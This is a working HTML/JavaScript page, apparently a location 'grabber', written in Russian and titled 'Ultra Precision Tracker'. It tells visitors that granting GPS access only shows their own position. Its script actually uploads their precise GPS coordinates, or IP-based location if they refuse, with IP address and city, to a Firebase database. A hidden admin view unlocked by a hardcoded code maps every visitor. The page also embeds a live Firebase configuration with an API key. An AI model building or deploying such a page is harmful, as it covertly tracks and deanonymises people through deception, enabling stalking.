<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultra Precision Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet-extra-markers@1.2.1/dist/css/leaflet.extra-markers.min.css">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #141414; padding: 25px; border-radius: 20px; box-shadow: 0 0 30px rgba(0,123,255,0.2); width: 95%; max-width: 1100px; text-align: center; border: 1px solid #333; }
        .hidden { display: none; }
        .admin-layout { display: grid; grid-template-columns: 350px 1fr; gap: 20px; margin-top: 20px; text-align: left; }
        #map { height: 550px; border-radius: 15px; border: 1px solid #007bff; }
        #logs { height: 550px; overflow-y: auto; background: #000; padding: 10px; border-radius: 15px; }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; cursor: pointer; border-radius: 10px; font-weight: bold; font-size: 16px; }
        input { padding: 12px; width: 250px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; text-align: center; }
        .log-item { background: #1a1a1a; margin-bottom: 8px; padding: 10px; border-radius: 8px; border-left: 4px solid #00ff88; font-size: 0.8em; }
        .accuracy-badge { font-size: 10px; background: #ff4444; padding: 2px 5px; border-radius: 4px; margin-left: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div id="agreement-step">
        <h2 style="color: #007bff;">Геолокационный мониторинг</h2>
        <p>Для работы карты необходимо разрешить доступ к GPS. <br>Это позволит отобразить ваше местоположение с точностью до метра.</p>
        <button onclick="handleAccess()">Предоставить доступ</button>
    </div>

    <div id="code-step" class="hidden">
        <h3>Система готова</h3>
        <input type="password" id="accessCode" placeholder="Секретный код...">
        <br><br>
        <button onclick="checkCode()">Войти в терминал</button>
    </div>

    <div id="result-step" class="hidden">
        <div class="admin-layout">
            <div id="logs">Загрузка...</div>
            <div id="map"></div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://cdn.jsdelivr.net/npm/leaflet-extra-markers@1.2.1/dist/js/leaflet.extra-markers.min.js"></script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { 
        apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
        authDomain: "flutter-ai-playground-caf0d.firebaseapp.com", 
        projectId: "flutter-ai-playground-caf0d", 
        storageBucket: "flutter-ai-playground-caf0d.firebasestorage.app", 
        messagingSenderId: "155816311480", 
        appId: "1:155816311480:web:a0456fcc4681e62837924d",
        databaseURL: "https://cheatip-default-rtdb.firebaseio.com"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const SECRET_CODE = "HTMLKODEYOURIP";
    let map, markersGroup;

    window.handleAccess = function() {
        // Запрашиваем реальное местоположение через браузер
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => { await sendData(pos.coords.latitude, pos.coords.longitude, "GPS"); },
                async () => { await sendDataByIP(); }, // Если запретил GPS, берем IP
                { enableHighAccuracy: true }
            );
        } else {
            sendDataByIP();
        }
        document.getElementById('agreement-step').classList.add('hidden');
        document.getElementById('code-step').classList.remove('hidden');
    }

    async function sendDataByIP() {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        await sendData(data.latitude, data.longitude, "IP-Geo");
    }

    async function sendData(lat, lng, method) {
        const res = await fetch('https://ipapi.co/json/');
        const ipData = await res.json();
        
        push(ref(db, 'visits'), {
            ip: ipData.ip,
            city: ipData.city,
            lat: lat,
            lng: lng,
            method: method, // Пометка, как получены данные
            time: new Date().toLocaleString('ru-RU'),
            timestamp: serverTimestamp()
        });
    }

    window.checkCode = function() {
        if (document.getElementById('accessCode').value === SECRET_CODE) {
            document.getElementById('code-step').classList.add('hidden');
            document.getElementById('result-step').classList.remove('hidden');
            setTimeout(initMap, 200);
        } else { alert("Ошибка!"); }
    }

    function initMap() {
        map = L.map('map').setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        markersGroup = L.layerGroup().addTo(map);
        loadData();
    }

    function loadData() {
        onValue(ref(db, 'visits'), (snapshot) => {
            const data = snapshot.val();
            const logsDiv = document.getElementById('logs');
            logsDiv.innerHTML = '';
            markersGroup.clearLayers();
            if (!data) return;

            const entries = Object.entries(data);
            const bounds = [];

            entries.forEach(([key, user], index) => {
                const num = index + 1;
                const isGPS = user.method === "GPS";
                
                // Лог
                const div = document.createElement('div');
                div.className = 'log-item';
                div.innerHTML = `<b>#${num}</b> ${isGPS ? '<span class="accuracy-badge">GPS ТОЧНО</span>' : ''}<br>
                                 <span style="color:#00ff88">${user.ip}</span><br>${user.city} | ${user.time}`;
                logsDiv.prepend(div);

                // Метка
                const icon = L.ExtraMarkers.icon({
                    number: num,
                    markerColor: isGPS ? 'green' : 'blue',
                    shape: 'circle',
                    prefix: 'fa'
                });

                const m = L.marker([user.lat, user.lng], {icon: icon})
                    .bindPopup(`Посетитель #${num}<br>Метод: ${user.method}<br>IP: ${user.ip}`);
                markersGroup.addLayer(m);
                bounds.push([user.lat, user.lng]);
            });
            if (bounds.length > 0) map.fitBounds(bounds);
        });
    }
</script>
</body>
</html>
